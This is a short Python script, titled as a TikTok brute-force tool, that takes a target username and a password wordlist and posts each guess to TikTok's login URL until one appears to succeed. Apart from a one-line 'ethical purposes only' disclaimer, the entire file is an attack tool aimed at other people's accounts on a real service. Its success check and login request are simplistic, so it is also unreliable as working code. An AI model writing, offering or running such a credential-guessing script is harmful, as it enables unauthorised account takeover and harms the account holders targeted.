# TikTok Brute Force Script
# Disclaimer: For ethical purposes only. Do not use maliciously.
import requests
import itertools
import time

# Function to attempt login
def attempt_login(username, password):
    url = "https://www.tiktok.com/login"
    payload = {"username": username, "password": password}
    headers = {"User-Agent": "Mozilla/5.0"}
    
    try:
        response = requests.post(url, data=payload, headers=headers)
        if response.status_code == 200 and "success" in response.text.lower():
            print(f"[+] Success! Username: {username}, Password: {password}")
            return True
        else:
            print(f"[-] Failed attempt: {password}")
    except Exception as e:
        print(f"[!] Error: {e}")
    return False

# Load usernames and passwords
def load_wordlist(filename):
    with open(filename, "r") as file:
        return file.read().splitlines()

def bruteforce_tiktok(username, wordlist):
    print(f"[*] Starting brute force attack on {username}")
    for password in wordlist:
        if attempt_login(username, password):
            print(f"[+] Password found: {password}")
            return
        time.sleep(1)  # Avoid overwhelming the server
    print("[!] Brute force attack failed. No password matched.")

# Main script
if __name__ == "__main__":
    username = input("Enter TikTok username: ")
    wordlist_file = input("Enter wordlist file path: ")
    
    wordlist = load_wordlist(wordlist_file)
    bruteforce_tiktok(username, wordlist)